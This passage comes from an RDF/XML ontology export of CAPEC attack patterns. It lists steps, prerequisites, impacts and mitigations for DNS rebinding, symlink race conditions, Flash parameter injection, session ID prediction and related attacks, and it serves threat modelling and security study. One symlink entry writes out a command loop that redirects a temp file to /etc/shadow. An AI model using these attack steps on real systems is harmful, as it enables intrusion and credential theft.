          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Identify potential DNS rebinding targets) An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers  flash players of old version.TECHNIQUE:Adversary uses Web advertisements to attract the victim to access adversary&apos;s DNS. Explore the versions of web browser or flash players in HTTP request.::STEP:2:PHASE:Experiment:DESCRIPTION:(Establish initial target access to adversary DNS) The first time the target accesses the adversary&apos;s content  the adversary&apos;s name must be resolved to an IP address. The adversary&apos;s DNS server performs this resolution  providing a short Time-To-Live (TTL) in order to prevent the target from caching the value.::STEP:3:PHASE:Experiment:DESCRIPTION:(Rebind DNS resolution to target address) The target makes a subsequent request to the adversary&apos;s content and the adversary&apos;s DNS server must again be queried  but this time the DNS server returns an address internal to the target&apos;s organization that would not be accessible from an outside source.::STEP:4:PHASE:Experiment:DESCRIPTION:(Determine exploitability of DNS rebinding access to target address) The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses.::STEP:5:PHASE:Exploit:DESCRIPTION:(Access &amp; exfiltrate data within the victim&apos;s security zone) The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.TECHNIQUE:Adversary attempts to use victim&apos;s browser as an HTTP proxy to other resources inside the target&apos;s security zone. This allows two IP addresses placed in the same security zone.:TECHNIQUE:Adversary tries to scan and access all internal hosts in victim&apos;s local network by sending multiple short-lived IP addresses.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-RepudiationTECHNICAL IMPACT:Gain Privileges::SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::350::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary&apos;s DNS name after initial contact.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:Setup DNS server and the adversary&apos;s web server. Write a malicious script to allow the victim to connect to the web server.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary&apos;s DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name  but which resolves subsequent requests by a single client to addresses internal to that client&apos;s network.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::While some information is shared by systems automatically based on standards and protocols  remove potentially sensitive information that is not necessary for the application&apos;s functionality as much as possible.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack36">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#224">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Fingerprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker170">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#285">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#ICMP Echo Request Ping"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack170">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#285"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other A successful attack of this kind can identify open ports and available services on a system.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to send an ICMP type 8 query (Echo Request) to a remote target and receive an ICMP type 0 message (ICMP Echo Reply) in response. Any firewalls or access control lists between the sender and receiver must allow ICMP Type 8 and ICMP Type 0 messages in order for a ping operation to succeed.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to know certain linux commands for this type of attack.:LEVEL:Low::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Scanners or utilities that provide the ability to send custom ICMP queries.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker62">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#541"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack62"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::None::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Configure your firewall to block egress ICMP messages.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack166">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#298">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:292::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#UDP Ping"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::200::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Bypass Protection Mechanism:TECHNICAL IMPACT:Hide Activities::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::The only known mitigation to this type of attack is to keep the malicious application off the system. There is nothing that can be done to the target application to protect itself from a malicious application that has been installed and executed.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack18">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#500">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:253::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#WebView Injection"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use safe libraries when creating temporary files. For instance the standard library function mkstemp can be used to safely create temporary files. For shell scripts  the system utility mktemp does the same thing.::Access to the directories should be restricted as to prevent attackers from manipulating the files. Denying access to a file can prevent an attacker from replacing that file with a link to a sensitive file.::Follow the principle of least privilege when assigning access rights to files.::Ensure good compartmentalization in the system to provide protected areas that can be trusted.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack454">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#27">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:29::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Leveraging Race Conditions via Symbolic Links"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::367::61::662::689::667::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Verify that target host&apos;s platform supports symbolic links.) This attack pattern is only applicable on platforms that support symbolic links.TECHNIQUE:Research target platform to determine whether it supports symbolic links.:TECHNIQUE:Create a symbolic link and ensure that it works as expected on the given platform.::STEP:2:PHASE:Explore:DESCRIPTION:(Examine application&apos;s file I/O behavior) Analyze the application&apos;s file I/O behavior to determine where it stores files  as well as the operations it performs to read/write files.TECHNIQUE:Use kernel tracing utility such as ktrace to monitor application behavior.:TECHNIQUE:Use debugging utility such as File Monitor to monitor the application&apos;s filesystem I/O calls:TECHNIQUE:Watch temporary directories to see when temporary files are created  modified and deleted.:TECHNIQUE:Analyze source code for open-source systems like Linux  Apache  etc.::STEP:3:PHASE:Experiment:DESCRIPTION:(Verify ability to write to filesystem) The attacker verifies ability to write to the target host&apos;s file system.TECHNIQUE:Create a file that does not exist in the target directory (e.g. touch temp.txt in UNIX-like systems):TECHNIQUE:On platforms that differentiate between file creation and file modification  if the target file that the application writes to already exists  attempt to modify it.:TECHNIQUE:Verify permissions on target directory::STEP:4:PHASE:Exploit:DESCRIPTION:(Replace file with a symlink to a sensitive system file.) Between the time that the application checks to see if a file exists (or if the user has access to it) and the time the application actually opens the file  the attacker replaces the file with a symlink to a sensitive system file.TECHNIQUE:Create an infinite loop containing commands such as rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat. Wait for an instance where the following steps occur in the given order: (1) Application ensures that tempfile.dat exists and that the user has access to it  (2) rm -f tempfile.dat; ln -s /etc/shadow tempfile.dat  and (3) Application opens tempfile.dat for writing  and inadvertently opens /etc/shadow for writing instead.:TECHNIQUE:Use other techniques with debugging tools to replace the file between the time the application checks the file and the time the application opens it.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption Denial of Service::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker61">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#313"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack61"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The ability to monitor network communications.Access to at least one host  and the privileges to interface with the network interface card.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Any tool capable of monitoring network communications  like a packet sniffer (e.g.  Wireshark)::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker177">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#174">
        <j.0:relatedPattern>
          <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:182::NATURE:CanAlsoBe:CAPEC ID:460::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:178::"/>
        </j.0:relatedPattern>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Flash Parameter Injection"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack177">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#174"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::88::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an adversary records all instances of HTML documents that have embedded Flash files. If there is an embedded Flash file  he lists how to pass global parameters to the Flash file from the embedding object.TECHNIQUE:Use an automated tool to record all instances of URLs which have embedded Flash files and list the parameters passing to the Flash file.:TECHNIQUE:Use a browser to manually explore the website to see whether the HTML document has embedded Flash files or not and list the parameters passing to the Flash file.::STEP:2:PHASE:Experiment:DESCRIPTION:(Determine the application susceptibility to Flash parameter injection) Determine the application susceptibility to Flash parameter injection. For each URL identified in the Explore phase  the adversary attempts to use various techniques such as DOM based  reflected  flashvars  and persistent attacks depending on the type of parameter passed to the embedded Flash file.TECHNIQUE:When the JavaScript &apos;document.location&apos; variable is used as part of the parameter  inject &apos;%23&apos; and the payload into the parameter in the URL.:TECHNIQUE:When the name of the Flash file is exposed as a form or a URL parameter  the attacker injects &apos;?&apos; and the payload after the file name in the URL to override some global value.:TECHNIQUE:When the arguments passed in the &apos;flashvars&apos; attributes  the attacker injects &apos;&amp;&apos; and payload in the URL.:TECHNIQUE:If some of the attributes of the &lt;object&gt; tag are received as parameters  the &apos;flashvars&apos; attribute is injected into the &lt;object&gt; tag without the creator of the Web page ever intending to allow arguments to be passed into the Flash file.:TECHNIQUE:If shared objects are used to save data that is entered by the user persistent Flash parameter injection may occur  with malicious code being injected into the Flash file and executed  every time the Flash file is loaded.::STEP:3:PHASE:Exploit:DESCRIPTION:(Execute Flash Parameter Injection Attack) Inject parameters into Flash file. Based on the results of the Experiment phase  the adversary crafts the underlying malicious URL containing injected Flash parameters and submits it to the web server. Once the web server receives the request  the embedding HTML document will controllable by the adversary.TECHNIQUE:Craft underlying malicious URL and send it to the web server to take control of the embedding HTML document.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::SCOPE:AuthorizationTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Authorization Execute Unauthorized Commands Run Arbitrary Code::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::88::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker need inject values into the global parameters to the Flash file and understand the parent HTML document DOM structure. The attacker need be smart enough to convince the victim to his crafted link.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The attacker must convince the victim to click their crafted link.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker64">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#414"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack64"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use a strong source of randomness to generate a session ID.::Use adequate length session IDs::Do not use information available to the user in order to generate session ID (e.g.  time).::Ideas for creating random numbers are offered by Eastlake (RFC1750)::Encrypt the session ID if you expose it to the user. For instance session ID can be stored in a cookie in encrypted format.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack465">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#59">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:196::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Session Credential Falsification through Prediction"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::290::330::331::346::488::539::200::6::285::384::693::719::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Find Session IDs) The attacker interacts with the target host and finds that session IDs are used to authenticate users.TECHNIQUE:An attacker makes many anonymous connections and records the session IDs assigned.:TECHNIQUE:An attacker makes authorized connections and records the session tokens or credentials issued.::STEP:2:PHASE:Explore:DESCRIPTION:(Characterize IDs) The attacker studies the characteristics of the session ID (size  format  etc.). As a results the attacker finds that legitimate session IDs are predictable.TECHNIQUE:Cryptanalysis. The attacker uses cryptanalysis to determine if the session IDs contain any cryptographic protections.:TECHNIQUE:Pattern tests. The attacker looks for patterns (odd/even  repetition  multiples  or other arithmetic relationships) between IDs:TECHNIQUE:Comparison against time. The attacker plots or compares the issued IDs to the time they were issued to check for correlation.::STEP:3:PHASE:Experiment:DESCRIPTION:(Match issued IDs) The attacker brute forces different values of session ID and manages to predict a valid session ID.TECHNIQUE:The attacker models the session ID algorithm enough to produce a compatible session IDs  or just one match.::STEP:4:PHASE:Exploit:DESCRIPTION:(Use matched Session ID) The attacker uses the falsified session ID to access the target system.TECHNIQUE:The attacker loads the session ID into his web browser and browses to restricted data or functionality.:TECHNIQUE:The attacker loads the session ID into his network communications and impersonates a legitimate user to gain access to data or functionality.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Strong physical security of the device.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack365">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#626">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:395::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Smudge Attack"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Access ControlTECHNICAL IMPACT:Bypass Protection Mechanism::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use multiple security questions (e.g. have three and make the user answer two of them correctly). Let the user select their own security questions or provide them with choices of questions that are not generic.::E-mail the temporary password to the registered e-mail address of the user rather than letting the user reset the password online.::Ensure that your password recovery functionality is not vulnerable to an injection style attack.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack305">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#50">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:212::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Password Recovery Exploitation"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::522::640::718::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:Understand the password recovery mechanism and how it works.::STEP:2:PHASE:Exploit:DESCRIPTION:Find a weakness in the password recovery mechanism and exploit it. For instance  a weakness may be that a standard single security question is used with an easy to determine answer.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker176">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#194"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack176"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::287::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::This attack is only applicable when a vulnerable entity associates data or services with an identity. Without such an association  there would be no reason to fake the source.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Resources required vary depending on the nature of the attack. Possible tools needed by an attacker could include tools to create custom network packets  specific client software  and tools to capture network traffic. Many variants of this attack require no attacker resources  however.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker63">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#415"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack63"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use known algorithm to avoid deadlock condition (for instance non-blocking synchronization algorithms).::For competing actions  use well-known libraries which implement synchronization.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack433">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#25">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Meta"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Forced Deadlock"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::412::567::662::833::667::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The adversary initiates an exploratory phase to get familiar with the system.::STEP:2:PHASE:Explore:DESCRIPTION:The adversary triggers a first action (such as holding a resource) and initiates a second action which will wait for the first one to finish.::STEP:3:PHASE:Explore:DESCRIPTION:If the target program has a deadlock condition  the program waits indefinitely resulting in a denial of service.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Resource Consumption:NOTE:Availability Resource Consumption A successful forced deadlock attack compromises the availability of the system by exhausting its available resources.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker175">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#584">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:582::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#BGP Route Disabling"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack175">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#584"/>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:AvailabilityTECHNICAL IMPACT:Other:NOTE:Availability Other Disabling a network route at the routing infrastructure level denies availability of that route.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary must have control of a router that can modify  drop  or introduce spoofed BGP updates.The adversary can convince::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::BGP Router::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker66">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#412"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack66"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker173">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#272"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack173"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
